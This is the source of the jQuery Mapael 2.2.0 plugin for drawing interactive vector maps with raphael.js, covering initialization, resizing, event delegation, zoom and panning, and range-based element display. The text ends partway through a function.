/*!
 *
 * Jquery Mapael - Dynamic maps jQuery plugin (based on raphael.js)
 * Requires jQuery, raphael.js and jquery.mousewheel
 *
 * Version: 2.2.0
 *
 * Copyright (c) 2017 Vincent Brouté (https://www.vincentbroute.fr/mapael)
 * Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php).
 *
 * Thanks to Indigo744
 *
 */
(function (factory) {
    if (typeof exports === 'object') {
        // CommonJS
        module.exports = factory(require('jquery'), require('raphael'), require('jquery-mousewheel'));
    } else if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define(['jquery', 'raphael', 'mousewheel'], factory);
    } else {
        // Browser globals
        factory(jQuery, Raphael, jQuery.fn.mousewheel);
    }
}(function ($, Raphael, mousewheel, undefined) {

    "use strict";

    // The plugin name (used on several places)
    var pluginName = "mapael";

    // Version number of jQuery Mapael. See http://semver.org/ for more information.
    var version = "2.2.0";

    /*
     * Mapael constructor
     * Init instance vars and call init()
     * @param container the DOM element on which to apply the plugin
     * @param options the complete options to use
     */
    var Mapael = function (container, options) {
        var self = this;

        // the global container (DOM element object)
        self.container = container;

        // the global container (jQuery object)
        self.$container = $(container);

        // the global options
        self.options = self.extendDefaultOptions(options);

        // zoom TimeOut handler (used to set and clear)
        self.zoomTO = 0;

        // zoom center coordinate (set at touchstart)
        self.zoomCenterX = 0;
        self.zoomCenterY = 0;

        // Zoom pinch (set at touchstart and touchmove)
        self.previousPinchDist = 0;

        // Zoom data
        self.zoomData = {
            zoomLevel: 0,
            zoomX: 0,
            zoomY: 0,
            panX: 0,
            panY: 0
        };

        self.currentViewBox = {
            x: 0, y: 0, w: 0, h: 0
        };

        // Panning: tell if panning action is in progress
        self.panning = false;

        // Animate view box
        self.zoomAnimID = null; // Interval handler (used to set and clear)
        self.zoomAnimStartTime = null; // Animation start time
        self.zoomAnimCVBTarget = null; // Current ViewBox target

        // Map subcontainer jQuery object
        self.$map = $("." + self.options.map.cssClass, self.container);

        // Save initial HTML content (used by destroy method)
        self.initialMapHTMLContent = self.$map.html();

        // The tooltip jQuery object
        self.$tooltip = {};

        // The paper Raphael object
        self.paper = {};

        // The areas object list
        self.areas = {};

        // The plots object list
        self.plots = {};

        // The links object list
        self.links = {};

        // The legends list
        self.legends = {};

        // The map configuration object (taken from map file)
        self.mapConf = {};

        // Holds all custom event handlers
        self.customEventHandlers = {};

        // Let's start the initialization
        self.init();
    };

    /*
     * Mapael Prototype
     * Defines all methods and properties needed by Mapael
     * Each mapael object inherits their properties and methods from this prototype
     */
    Mapael.prototype = {

        /* Filtering TimeOut value in ms
         * Used for mouseover trigger over elements */
        MouseOverFilteringTO: 120,
        /* Filtering TimeOut value in ms
         * Used for afterPanning trigger when panning */
        panningFilteringTO: 150,
        /* Filtering TimeOut value in ms
         * Used for mouseup/touchend trigger when panning */
        panningEndFilteringTO: 50,
        /* Filtering TimeOut value in ms
         * Used for afterZoom trigger when zooming */
        zoomFilteringTO: 150,
        /* Filtering TimeOut value in ms
         * Used for when resizing window */
        resizeFilteringTO: 150,

        /*
         * Initialize the plugin
         * Called by the constructor
         */
        init: function () {
            var self = this;

            // Init check for class existence
            if (self.options.map.cssClass === "" || $("." + self.options.map.cssClass, self.container).length === 0) {
                throw new Error("The map class `" + self.options.map.cssClass + "` doesn't exists");
            }

            // Create the tooltip container
            self.$tooltip = $("<div>").addClass(self.options.map.tooltip.cssClass).css("display", "none");

            // Get the map container, empty it then append tooltip
            self.$map.empty().append(self.$tooltip);

            // Get the map from $.mapael or $.fn.mapael (backward compatibility)
            if ($[pluginName] && $[pluginName].maps && $[pluginName].maps[self.options.map.name]) {
                // Mapael version >= 2.x
                self.mapConf = $[pluginName].maps[self.options.map.name];
            } else if ($.fn[pluginName] && $.fn[pluginName].maps && $.fn[pluginName].maps[self.options.map.name]) {
                // Mapael version <= 1.x - DEPRECATED
                self.mapConf = $.fn[pluginName].maps[self.options.map.name];
                if (window.console && window.console.warn) {
                    window.console.warn("Extending $.fn.mapael is deprecated (map '" + self.options.map.name + "')");
                }
            } else {
                throw new Error("Unknown map '" + self.options.map.name + "'");
            }

            // Create Raphael paper
            self.paper = new Raphael(self.$map[0], self.mapConf.width, self.mapConf.height);

            // issue #135: Check for Raphael bug on text element boundaries
            if (self.isRaphaelBBoxBugPresent() === true) {
                self.destroy();
                throw new Error("Can't get boundary box for text (is your container hidden? See #135)");
            }

            // add plugin class name on element
            self.$container.addClass(pluginName);

            if (self.options.map.tooltip.css) self.$tooltip.css(self.options.map.tooltip.css);
            self.setViewBox(0, 0, self.mapConf.width, self.mapConf.height);

            // Handle map size
            if (self.options.map.width) {
                // NOT responsive: map has a fixed width
                self.paper.setSize(self.options.map.width, self.mapConf.height * (self.options.map.width / self.mapConf.width));
            } else {
                // Responsive: handle resizing of the map
                self.initResponsiveSize();
            }

            // Draw map areas
            $.each(self.mapConf.elems, function (id) {
                // Init area object
                self.areas[id] = {};
                // Set area options
                self.areas[id].options = self.getElemOptions(
                    self.options.map.defaultArea,
                    (self.options.areas[id] ? self.options.areas[id] : {}),
                    self.options.legend.area
                );
                // draw area
                self.areas[id].mapElem = self.paper.path(self.mapConf.elems[id]);
            });

            // Hook that allows to add custom processing on the map
            if (self.options.map.beforeInit) self.options.map.beforeInit(self.$container, self.paper, self.options);

            // Init map areas in a second loop
            // Allows text to be added after ALL areas and prevent them from being hidden
            $.each(self.mapConf.elems, function (id) {
                self.initElem(id, 'area', self.areas[id]);
            });

            // Draw links
            self.links = self.drawLinksCollection(self.options.links);

            // Draw plots
            $.each(self.options.plots, function (id) {
                self.plots[id] = self.drawPlot(id);
            });

            // Attach zoom event
            self.$container.on("zoom." + pluginName, function (e, zoomOptions) {
                self.onZoomEvent(e, zoomOptions);
            });

            if (self.options.map.zoom.enabled) {
                // Enable zoom
                self.initZoom(self.mapConf.width, self.mapConf.height, self.options.map.zoom);
            }

            // Set initial zoom
            if (self.options.map.zoom.init !== undefined) {
                if (self.options.map.zoom.init.animDuration === undefined) {
                    self.options.map.zoom.init.animDuration = 0;
                }
                self.$container.trigger("zoom", self.options.map.zoom.init);
            }

            // Create the legends for areas
            self.createLegends("area", self.areas, 1);

            // Create the legends for plots taking into account the scale of the map
            self.createLegends("plot", self.plots, self.paper.width / self.mapConf.width);

            // Attach update event
            self.$container.on("update." + pluginName, function (e, opt) {
                self.onUpdateEvent(e, opt);
            });

            // Attach showElementsInRange event
            self.$container.on("showElementsInRange." + pluginName, function (e, opt) {
                self.onShowElementsInRange(e, opt);
            });

            // Attach delegated events
            self.initDelegatedMapEvents();
            // Attach delegated custom events
            self.initDelegatedCustomEvents();

            // Hook that allows to add custom processing on the map
            if (self.options.map.afterInit) self.options.map.afterInit(self.$container, self.paper, self.areas, self.plots, self.options);

            $(self.paper.desc).append(" and Mapael " + self.version + " (https://www.vincentbroute.fr/mapael/)");
        },

        /*
         * Destroy mapael
         * This function effectively detach mapael from the container
         *   - Set the container back to the way it was before mapael instanciation
         *   - Remove all data associated to it (memory can then be free'ed by browser)
         *
         * This method can be call directly by user:
         *     $(".mapcontainer").data("mapael").destroy();
         *
         * This method is also automatically called if the user try to call mapael
         * on a container already containing a mapael instance
         */
        destroy: function () {
            var self = this;

            // Detach all event listeners attached to the container
            self.$container.off("." + pluginName);
            self.$map.off("." + pluginName);

            // Detach the global resize event handler
            if (self.onResizeEvent) $(window).off("resize." + pluginName, self.onResizeEvent);

            // Empty the container (this will also detach all event listeners)
            self.$map.empty();

            // Replace initial HTML content
            self.$map.html(self.initialMapHTMLContent);

            // Empty legend containers and replace initial HTML content
            $.each(self.legends, function(legendType) {
                $.each(self.legends[legendType], function(legendIndex) {
                    var legend = self.legends[legendType][legendIndex];
                    legend.container.empty();
                    legend.container.html(legend.initialHTMLContent);
                });
            });

            // Remove mapael class
            self.$container.removeClass(pluginName);

            // Remove the data
            self.$container.removeData(pluginName);

            // Remove all internal reference
            self.container = undefined;
            self.$container = undefined;
            self.options = undefined;
            self.paper = undefined;
            self.$map = undefined;
            self.$tooltip = undefined;
            self.mapConf = undefined;
            self.areas = undefined;
            self.plots = undefined;
            self.links = undefined;
            self.customEventHandlers = undefined;
        },

        initResponsiveSize: function () {
            var self = this;
            var resizeTO = null;

            // Function that actually handle the resizing
            var handleResize = function(isInit) {
                var containerWidth = self.$map.width();

                if (self.paper.width !== containerWidth) {
                    var newScale = containerWidth / self.mapConf.width;
                    // Set new size
                    self.paper.setSize(containerWidth, self.mapConf.height * newScale);

                    // Create plots legend again to take into account the new scale
                    // Do not do this on init (it will be done later)
                    if (isInit !== true && self.options.legend.redrawOnResize) {
                        self.createLegends("plot", self.plots, newScale);
                    }
                }
            };

            self.onResizeEvent = function() {
                // Clear any previous setTimeout (avoid too much triggering)
                clearTimeout(resizeTO);
                // setTimeout to wait for the user to finish its resizing
                resizeTO = setTimeout(function () {
                    handleResize();
                }, self.resizeFilteringTO);
            };

            // Attach resize handler
            $(window).on("resize." + pluginName, self.onResizeEvent);

            // Call once
            handleResize(true);
        },

        /*
         * Extend the user option with the default one
         * @param options the user options
         * @return new options object
         */
        extendDefaultOptions: function (options) {

            // Extend default options with user options
            options = $.extend(true, {}, Mapael.prototype.defaultOptions, options);

            // Extend legend default options
            $.each(['area', 'plot'], function (key, type) {
                if ($.isArray(options.legend[type])) {
                    for (var i = 0; i < options.legend[type].length; ++i)
                        options.legend[type][i] = $.extend(true, {}, Mapael.prototype.legendDefaultOptions[type], options.legend[type][i]);
                } else {
                    options.legend[type] = $.extend(true, {}, Mapael.prototype.legendDefaultOptions[type], options.legend[type]);
                }
            });

            return options;
        },

        /*
         * Init all delegated events for the whole map:
         *  mouseover
         *  mousemove
         *  mouseout
         */
        initDelegatedMapEvents: function() {
            var self = this;

            // Mapping between data-type value and the corresponding elements array
            // Note: legend-elem and legend-label are not in this table because
            //       they need a special processing
            var dataTypeToElementMapping = {
                'area'  : self.areas,
                'area-text' : self.areas,
                'plot' : self.plots,
                'plot-text' : self.plots,
                'link' : self.links,
                'link-text' : self.links
            };

            /* Attach mouseover event delegation
             * Note: we filter the event with a timeout to reduce the firing when the mouse moves quickly
             */
            var mapMouseOverTimeoutID;
            self.$container.on("mouseover." + pluginName, "[data-id]", function () {
                var elem = this;
                clearTimeout(mapMouseOverTimeoutID);
                mapMouseOverTimeoutID = setTimeout(function() {
                    var $elem = $(elem);
                    var id = $elem.attr('data-id');
                    var type = $elem.attr('data-type');

                    if (dataTypeToElementMapping[type] !== undefined) {
                        self.elemEnter(dataTypeToElementMapping[type][id]);
                    } else if (type === 'legend-elem' || type === 'legend-label') {
                        var legendIndex = $elem.attr('data-legend-id');
                        var legendType = $elem.attr('data-legend-type');
                        self.elemEnter(self.legends[legendType][legendIndex].elems[id]);
                    }
                }, self.MouseOverFilteringTO);
            });

            /* Attach mousemove event delegation
             * Note: timeout filtering is small to update the Tooltip position fast
             */
            var mapMouseMoveTimeoutID;
            self.$container.on("mousemove." + pluginName, "[data-id]", function (event) {
                var elem = this;
                clearTimeout(mapMouseMoveTimeoutID);
                mapMouseMoveTimeoutID = setTimeout(function() {
                    var $elem = $(elem);
                    var id = $elem.attr('data-id');
                    var type = $elem.attr('data-type');

                    if (dataTypeToElementMapping[type] !== undefined) {
                        self.elemHover(dataTypeToElementMapping[type][id], event);
                    } else if (type === 'legend-elem' || type === 'legend-label') {
                        /* Nothing to do */
                    }

                }, 0);
            });

            /* Attach mouseout event delegation
             * Note: we don't perform any timeout filtering to clear & reset elem ASAP
             * Otherwise an element may be stuck in 'hover' state (which is NOT good)
             */
            self.$container.on("mouseout." + pluginName, "[data-id]", function () {
                var elem = this;
                // Clear any
                clearTimeout(mapMouseOverTimeoutID);
                clearTimeout(mapMouseMoveTimeoutID);
                var $elem = $(elem);
                var id = $elem.attr('data-id');
                var type = $elem.attr('data-type');

                if (dataTypeToElementMapping[type] !== undefined) {
                    self.elemOut(dataTypeToElementMapping[type][id]);
                } else if (type === 'legend-elem' || type === 'legend-label') {
                    var legendIndex = $elem.attr('data-legend-id');
                    var legendType = $elem.attr('data-legend-type');
                    self.elemOut(self.legends[legendType][legendIndex].elems[id]);
                }
            });

            /* Attach click event delegation
             * Note: we filter the event with a timeout to avoid double click
             */
            self.$container.on("click." + pluginName, "[data-id]", function (evt, opts) {
                var $elem = $(this);
                var id = $elem.attr('data-id');
                var type = $elem.attr('data-type');

                if (dataTypeToElementMapping[type] !== undefined) {
                    self.elemClick(dataTypeToElementMapping[type][id]);
                } else if (type === 'legend-elem' || type === 'legend-label') {
                    var legendIndex = $elem.attr('data-legend-id');
                    var legendType = $elem.attr('data-legend-type');
                    self.handleClickOnLegendElem(self.legends[legendType][legendIndex].elems[id], id, legendIndex, legendType, opts);
                }
            });
        },

        /*
         * Init all delegated custom events
         */
        initDelegatedCustomEvents: function() {
            var self = this;

            $.each(self.customEventHandlers, function(eventName) {
                // Namespace the custom event
                // This allow to easily unbound only custom events and not regular ones
                var fullEventName = eventName + '.' + pluginName + ".custom";
                self.$container.off(fullEventName).on(fullEventName, "[data-id]", function (e) {
                    var $elem = $(this);
                    var id = $elem.attr('data-id');
                    var type = $elem.attr('data-type').replace('-text', '');

                    if (!self.panning &&
                        self.customEventHandlers[eventName][type] !== undefined &&
                        self.customEventHandlers[eventName][type][id] !== undefined)
                    {
                        // Get back related elem
                        var elem = self.customEventHandlers[eventName][type][id];
                        // Run callback provided by user
                        elem.options.eventHandlers[eventName](e, id, elem.mapElem, elem.textElem, elem.options);
                    }
                });
            });

        },

        /*
         * Init the element "elem" on the map (drawing text, setting attributes, events, tooltip, ...)
         *
         * @param id the id of the element
         * @param type the type of the element (area, plot, link)
         * @param elem object the element object (with mapElem), it will be updated
         */
        initElem: function (id, type, elem) {
            var self = this;
            var $mapElem = $(elem.mapElem.node);

            // If an HTML link exists for this element, add cursor attributes
            if (elem.options.href) {
                elem.options.attrs.cursor = "pointer";
                if (elem.options.text) elem.options.text.attrs.cursor = "pointer";
            }

            // Set SVG attributes to map element
            elem.mapElem.attr(elem.options.attrs);
            // Set DOM attributes to map element
            $mapElem.attr({
                "data-id": id,
                "data-type": type
            });
            if (elem.options.cssClass !== undefined) {
                $mapElem.addClass(elem.options.cssClass);
            }

            // Init the label related to the element
            if (elem.options.text && elem.options.text.content !== undefined) {
                // Set a text label in the area
                var textPosition = self.getTextPosition(elem.mapElem.getBBox(), elem.options.text.position, elem.options.text.margin);
                elem.options.text.attrs.text = elem.options.text.content;
                elem.options.text.attrs.x = textPosition.x;
                elem.options.text.attrs.y = textPosition.y;
                elem.options.text.attrs['text-anchor'] = textPosition.textAnchor;
                // Draw text
                elem.textElem = self.paper.text(textPosition.x, textPosition.y, elem.options.text.content);
                // Apply SVG attributes to text element
                elem.textElem.attr(elem.options.text.attrs);
                // Apply DOM attributes
                $(elem.textElem.node).attr({
                    "data-id": id,
                    "data-type": type + '-text'
                });
            }

            // Set user event handlers
            if (elem.options.eventHandlers) self.setEventHandlers(id, type, elem);

            // Set hover option for mapElem
            self.setHoverOptions(elem.mapElem, elem.options.attrs, elem.options.attrsHover);

            // Set hover option for textElem
            if (elem.textElem) self.setHoverOptions(elem.textElem, elem.options.text.attrs, elem.options.text.attrsHover);
        },

        /*
         * Init zoom and panning for the map
         * @param mapWidth
         * @param mapHeight
         * @param zoomOptions
         */
        initZoom: function (mapWidth, mapHeight, zoomOptions) {
            var self = this;
            var mousedown = false;
            var previousX = 0;
            var previousY = 0;
            var fnZoomButtons = {
                "reset": function () {
                    self.$container.trigger("zoom", {"level": 0});
                },
                "in": function () {
                    self.$container.trigger("zoom", {"level": "+1"});
                },
                "out": function () {
                    self.$container.trigger("zoom", {"level": -1});
                }
            };

            // init Zoom data
            $.extend(self.zoomData, {
                zoomLevel: 0,
                panX: 0,
                panY: 0
            });

            // init zoom buttons
            $.each(zoomOptions.buttons, function(type, opt) {
                if (fnZoomButtons[type] === undefined) throw new Error("Unknown zoom button '" + type + "'");
                // Create div with classes, contents and title (for tooltip)
                var $button = $("<div>").addClass(opt.cssClass)
                    .html(opt.content)
                    .attr("title", opt.title);
                // Assign click event
                $button.on("click." + pluginName, fnZoomButtons[type]);
                // Append to map
                self.$map.append($button);
            });

            // Update the zoom level of the map on mousewheel
            if (self.options.map.zoom.mousewheel) {
                self.$map.on("mousewheel." + pluginName, function (e) {
                    var zoomLevel = (e.deltaY > 0) ? 1 : -1;
                    var coord = self.mapPagePositionToXY(e.pageX, e.pageY);

                    self.$container.trigger("zoom", {
                        "fixedCenter": true,
                        "level": self.zoomData.zoomLevel + zoomLevel,
                        "x": coord.x,
                        "y": coord.y
                    });

                    e.preventDefault();
                });
            }

            // Update the zoom level of the map on touch pinch
            if (self.options.map.zoom.touch) {
                self.$map.on("touchstart." + pluginName, function (e) {
                    if (e.originalEvent.touches.length === 2) {
                        self.zoomCenterX = (e.originalEvent.touches[0].pageX + e.originalEvent.touches[1].pageX) / 2;
                        self.zoomCenterY = (e.originalEvent.touches[0].pageY + e.originalEvent.touches[1].pageY) / 2;
                        self.previousPinchDist = Math.sqrt(Math.pow((e.originalEvent.touches[1].pageX - e.originalEvent.touches[0].pageX), 2) + Math.pow((e.originalEvent.touches[1].pageY - e.originalEvent.touches[0].pageY), 2));
                    }
                });

                self.$map.on("touchmove." + pluginName, function (e) {
                    var pinchDist = 0;
                    var zoomLevel = 0;

                    if (e.originalEvent.touches.length === 2) {
                        pinchDist = Math.sqrt(Math.pow((e.originalEvent.touches[1].pageX - e.originalEvent.touches[0].pageX), 2) + Math.pow((e.originalEvent.touches[1].pageY - e.originalEvent.touches[0].pageY), 2));

                        if (Math.abs(pinchDist - self.previousPinchDist) > 15) {
                            var coord = self.mapPagePositionToXY(self.zoomCenterX, self.zoomCenterY);
                            zoomLevel = (pinchDist - self.previousPinchDist) / Math.abs(pinchDist - self.previousPinchDist);
                            self.$container.trigger("zoom", {
                                "fixedCenter": true,
                                "level": self.zoomData.zoomLevel + zoomLevel,
                                "x": coord.x,
                                "y": coord.y
                            });
                            self.previousPinchDist = pinchDist;
                        }
                        return false;
                    }
                });
            }

            // When the user drag the map, prevent to move the clicked element instead of dragging the map (behaviour seen with Firefox)
            self.$map.on("dragstart", function() {
                return false;
            });

            // Panning
            var panningMouseUpTO = null;
            var panningMouseMoveTO = null;
            $("body").on("mouseup." + pluginName + (zoomOptions.touch ? " touchend." + pluginName : ""), function () {
                mousedown = false;
                clearTimeout(panningMouseUpTO);
                clearTimeout(panningMouseMoveTO);
                panningMouseUpTO = setTimeout(function () {
                    self.panning = false;
                }, self.panningEndFilteringTO);
            });

            self.$map.on("mousedown." + pluginName + (zoomOptions.touch ? " touchstart." + pluginName : ""), function (e) {
                clearTimeout(panningMouseUpTO);
                clearTimeout(panningMouseMoveTO);
                if (e.pageX !== undefined) {
                    mousedown = true;
                    previousX = e.pageX;
                    previousY = e.pageY;
                } else {
                    if (e.originalEvent.touches.length === 1) {
                        mousedown = true;
                        previousX = e.originalEvent.touches[0].pageX;
                        previousY = e.originalEvent.touches[0].pageY;
                    }
                }
            }).on("mousemove." + pluginName + (zoomOptions.touch ? " touchmove." + pluginName : ""), function (e) {
                var currentLevel = self.zoomData.zoomLevel;
                var pageX = 0;
                var pageY = 0;

                clearTimeout(panningMouseUpTO);
                clearTimeout(panningMouseMoveTO);

                if (e.pageX !== undefined) {
                    pageX = e.pageX;
                    pageY = e.pageY;
                } else {
                    if (e.originalEvent.touches.length === 1) {
                        pageX = e.originalEvent.touches[0].pageX;
                        pageY = e.originalEvent.touches[0].pageY;
                    } else {
                        mousedown = false;
                    }
                }

                if (mousedown && currentLevel !== 0) {
                    var offsetX = (previousX - pageX) / (1 + (currentLevel * zoomOptions.step)) * (mapWidth / self.paper.width);
                    var offsetY = (previousY - pageY) / (1 + (currentLevel * zoomOptions.step)) * (mapHeight / self.paper.height);
                    var panX = Math.min(Math.max(0, self.currentViewBox.x + offsetX), (mapWidth - self.currentViewBox.w));
                    var panY = Math.min(Math.max(0, self.currentViewBox.y + offsetY), (mapHeight - self.currentViewBox.h));

                    if (Math.abs(offsetX) > 5 || Math.abs(offsetY) > 5) {
                        $.extend(self.zoomData, {
                            panX: panX,
                            panY: panY,
                            zoomX: panX + self.currentViewBox.w / 2,
                            zoomY: panY + self.currentViewBox.h / 2
                        });
                        self.setViewBox(panX, panY, self.currentViewBox.w, self.currentViewBox.h);

                        panningMouseMoveTO = setTimeout(function () {
                            self.$map.trigger("afterPanning", {
                                x1: panX,
                                y1: panY,
                                x2: (panX + self.currentViewBox.w),
                                y2: (panY + self.currentViewBox.h)
                            });
                        }, self.panningFilteringTO);

                        previousX = pageX;
                        previousY = pageY;
                        self.panning = true;
                    }
                    return false;
                }
            });
        },

        /*
         * Map a mouse position to a map position
         *      Transformation principle:
         *          ** start with (pageX, pageY) absolute mouse coordinate
         *          - Apply translation: take into accounts the map offset in the page
         *          ** from this point, we have relative mouse coordinate
         *          - Apply homothetic transformation: take into accounts initial factor of map sizing (fullWidth / actualWidth)
         *          - Apply homothetic transformation: take into accounts the zoom factor
         *          ** from this point, we have relative map coordinate
         *          - Apply translation: take into accounts the current panning of the map
         *          ** from this point, we have absolute map coordinate
         * @param pageX: mouse client coordinate on X
         * @param pageY: mouse client coordinate on Y
         * @return map coordinate {x, y}
         */
        mapPagePositionToXY: function(pageX, pageY) {
            var self = this;
            var offset = self.$map.offset();
            var initFactor = (self.options.map.width) ? (self.mapConf.width / self.options.map.width) : (self.mapConf.width / self.$map.width());
            var zoomFactor = 1 / (1 + (self.zoomData.zoomLevel * self.options.map.zoom.step));
            return {
                x: (zoomFactor * initFactor * (pageX - offset.left)) + self.zoomData.panX,
                y: (zoomFactor * initFactor * (pageY - offset.top)) + self.zoomData.panY
            };
        },

        /*
         * Zoom on the map
         *
         * zoomOptions.animDuration zoom duration
         *
         * zoomOptions.level        level of the zoom between minLevel and maxLevel (absolute number, or relative string +1 or -1)
         * zoomOptions.fixedCenter  set to true in order to preserve the position of x,y in the canvas when zoomed
         *
         * zoomOptions.x            x coordinate of the point to focus on
         * zoomOptions.y            y coordinate of the point to focus on
         * - OR -
         * zoomOptions.latitude     latitude of the point to focus on
         * zoomOptions.longitude    longitude of the point to focus on
         * - OR -
         * zoomOptions.plot         plot ID to focus on
         * - OR -
         * zoomOptions.area         area ID to focus on
         * zoomOptions.areaMargin   margin (in pixels) around the area
         *
         * If an area ID is specified, the algorithm will override the zoom level to focus on the area
         * but it may be limited by the min/max zoom level limits set at initialization.
         *
         * If no coordinates are specified, the zoom will be focused on the center of the current view box
         *
         */
        onZoomEvent: function (e, zoomOptions) {
            var self = this;

            // new Top/Left corner coordinates
            var panX;
            var panY;
            // new Width/Height viewbox size
            var panWidth;
            var panHeight;

            // Zoom level in absolute scale (from 0 to max, by step of 1)
            var zoomLevel = self.zoomData.zoomLevel;

            // Relative zoom level (from 1 to max, by step of 0.25 (default))
            var previousRelativeZoomLevel = 1 + self.zoomData.zoomLevel * self.options.map.zoom.step;
            var relativeZoomLevel;

            var animDuration = (zoomOptions.animDuration !== undefined) ? zoomOptions.animDuration : self.options.map.zoom.animDuration;

            if (zoomOptions.area !== undefined) {
                /* An area is given
                 * We will define x/y coordinate AND a new zoom level to fill the area
                 */
                if (self.areas[zoomOptions.area] === undefined) throw new Error("Unknown area '" + zoomOptions.area + "'");
                var areaMargin = (zoomOptions.areaMargin !== undefined) ? zoomOptions.areaMargin : 10;
                var areaBBox = self.areas[zoomOptions.area].mapElem.getBBox();
                var areaFullWidth = areaBBox.width + 2 * areaMargin;
                var areaFullHeight = areaBBox.height + 2 * areaMargin;

                // Compute new x/y focus point (center of area)
                zoomOptions.x = areaBBox.cx;
                zoomOptions.y = areaBBox.cy;

                // Compute a new absolute zoomLevel value (inverse of relative -> absolute)
                // Take the min between zoomLevel on width vs. height to be able to see the whole area
                zoomLevel = Math.min(Math.floor((self.mapConf.width / areaFullWidth - 1) / self.options.map.zoom.step),
                                     Math.floor((self.mapConf.height / areaFullHeight - 1) / self.options.map.zoom.step));

            } else {

                // Get user defined zoom level
                if (zoomOptions.level !== undefined) {
                    if (typeof zoomOptions.level === "string") {
                        // level is a string, either "n", "+n" or "-n"
                        if ((zoomOptions.level.slice(0, 1) === '+') || (zoomOptions.level.slice(0, 1) === '-')) {
                            // zoomLevel is relative
                            zoomLevel = self.zoomData.zoomLevel + parseInt(zoomOptions.level, 10);
                        } else {
                            // zoomLevel is absolute
                            zoomLevel = parseInt(zoomOptions.level, 10);
                        }
                    } else {
                        // level is integer
                        if (zoomOptions.level < 0) {
                            // zoomLevel is relative
                            zoomLevel = self.zoomData.zoomLevel + zoomOptions.level;
                        } else {
                            // zoomLevel is absolute
                            zoomLevel = zoomOptions.level;
                        }
                    }
                }

                if (zoomOptions.plot !== undefined) {
                    if (self.plots[zoomOptions.plot] === undefined) throw new Error("Unknown plot '" + zoomOptions.plot + "'");

                    zoomOptions.x = self.plots[zoomOptions.plot].coords.x;
                    zoomOptions.y = self.plots[zoomOptions.plot].coords.y;
                } else {
                    if (zoomOptions.latitude !== undefined && zoomOptions.longitude !== undefined) {
                        var coords = self.mapConf.getCoords(zoomOptions.latitude, zoomOptions.longitude);
                        zoomOptions.x = coords.x;
                        zoomOptions.y = coords.y;
                    }

                    if (zoomOptions.x === undefined) {
                        zoomOptions.x = self.currentViewBox.x + self.currentViewBox.w / 2;
                    }

                    if (zoomOptions.y === undefined) {
                        zoomOptions.y = self.currentViewBox.y + self.currentViewBox.h / 2;
                    }
                }
            }

            // Make sure we stay in the zoom level boundaries
            zoomLevel = Math.min(Math.max(zoomLevel, self.options.map.zoom.minLevel), self.options.map.zoom.maxLevel);

            // Compute relative zoom level
            relativeZoomLevel = 1 + zoomLevel * self.options.map.zoom.step;

            // Compute panWidth / panHeight
            panWidth = self.mapConf.width / relativeZoomLevel;
            panHeight = self.mapConf.height / relativeZoomLevel;

            if (zoomLevel === 0) {
                panX = 0;
                panY = 0;
            } else {
                if (zoomOptions.fixedCenter !== undefined && zoomOptions.fixedCenter === true) {
                    panX = self.zoomData.panX + ((zoomOptions.x - self.zoomData.panX) * (relativeZoomLevel - previousRelativeZoomLevel)) / relativeZoomLevel;
                    panY = self.zoomData.panY + ((zoomOptions.y - self.zoomData.panY) * (relativeZoomLevel - previousRelativeZoomLevel)) / relativeZoomLevel;
                } else {
                    panX = zoomOptions.x - panWidth / 2;
                    panY = zoomOptions.y - panHeight / 2;
                }

                // Make sure we stay in the map boundaries
                panX = Math.min(Math.max(0, panX), self.mapConf.width - panWidth);
                panY = Math.min(Math.max(0, panY), self.mapConf.height - panHeight);
            }

            // Update zoom level of the map
            if (relativeZoomLevel === previousRelativeZoomLevel && panX === self.zoomData.panX && panY === self.zoomData.panY) return;

            if (animDuration > 0) {
                self.animateViewBox(panX, panY, panWidth, panHeight, animDuration, self.options.map.zoom.animEasing);
            } else {
                self.setViewBox(panX, panY, panWidth, panHeight);
                clearTimeout(self.zoomTO);
                self.zoomTO = setTimeout(function () {
                    self.$map.trigger("afterZoom", {
                        x1: panX,
                        y1: panY,
                        x2: panX + panWidth,
                        y2: panY + panHeight
                    });
                }, self.zoomFilteringTO);
            }

            $.extend(self.zoomData, {
                zoomLevel: zoomLevel,
                panX: panX,
                panY: panY,
                zoomX: panX + panWidth / 2,
                zoomY: panY + panHeight / 2
            });
        },

        /*
         * Show some element in range defined by user
         * Triggered by user $(".mapcontainer").trigger("showElementsInRange", [opt]);
         *
         * @param opt the options
         *  opt.hiddenOpacity opacity for hidden element (default = 0.3)
         *  opt.animDuration animation duration in ms (default = 0)
         *  opt.afterShowRange callback
         *  opt.ranges the range to show:
         *  Example:
         *  opt.ranges = {
         *      'plot' : {
         *          0 : {                        // valueIndex
         *              'min': 1000,
         *              'max': 1200
         *          },
         *          1 : {                        // valueIndex
         *              'min': 10,
         *              'max': 12
         *          }
         *      },
         *      'area' : {
         *          {'min': 10, 'max': 20}    // No valueIndex, only an object, use 0 as valueIndex (easy case)
         *      }
         *  }
         */
        onShowElementsInRange: function(e, opt) {
            var self = this;

            // set animDuration to default if not defined
            if (opt.animDuration === undefined) {
                opt.animDuration = 0;
            }

            // set hiddenOpacity to default if not defined
            if (opt.hiddenOpacity === undefined) {
                opt.hiddenOpacity = 0.3;
            }

            // handle area
            if (opt.ranges && opt.ranges.area) {
                self.showElemByRange(opt.ranges.area, self.areas, opt.hiddenOpacity, opt.animDuration);
            }

            // handle plot
            if (opt.ranges && opt.ranges.plot) {
                self.showElemByRange(opt.ranges.plot, self.plots, opt.hiddenOpacity, opt.animDuration);
            }

            // handle link
            if (opt.ranges && opt.ranges.link) {
                self.showElemByRange(opt.ranges.link, self.links, opt.hiddenOpacity, opt.animDuration);
            }

            // Call user callback
            if (opt.afterShowRange) opt.afterShowRange();
        },

        /*
         * Show some element in range
         * @param ranges: the ranges
         * @param elems: list of element on which to check against previous range
         * @hiddenOpacity: the opacity when hidden
         * @animDuration: the animation duration
         */
        showElemByRange: function(ranges, elems, hiddenOpacity, animDuration) {
            var self = this;
            // Hold the final opacity value for all elements consolidated after applying each ranges
            // This allow to set the opacity only once for each elements
            var elemsFinalOpacity = {};

            // set object with one valueIndex to 0 if we have directly the min/max
            if (ranges.min !== undefined || ranges.max !== undefined) {
                ranges = {0: ranges};
            }

            // Loop through each valueIndex
            $.each(ranges, function (valueIndex) {
                var range = ranges[valueIndex];
                // Check if user defined at least a min or max value
                if (range.min === undefined && range.max === undefined) {
                    return true; // skip this iteration (each loop), goto next range
                }
                // Loop through each elements
                $.each(elems, function (id) {
                    var elemValue = elems[id].options.value;
                    // set value with one valueIndex to 0 if not object
                    if (typeof elemValue !== "object") {
                        elemValue = [elemValue];
                    }
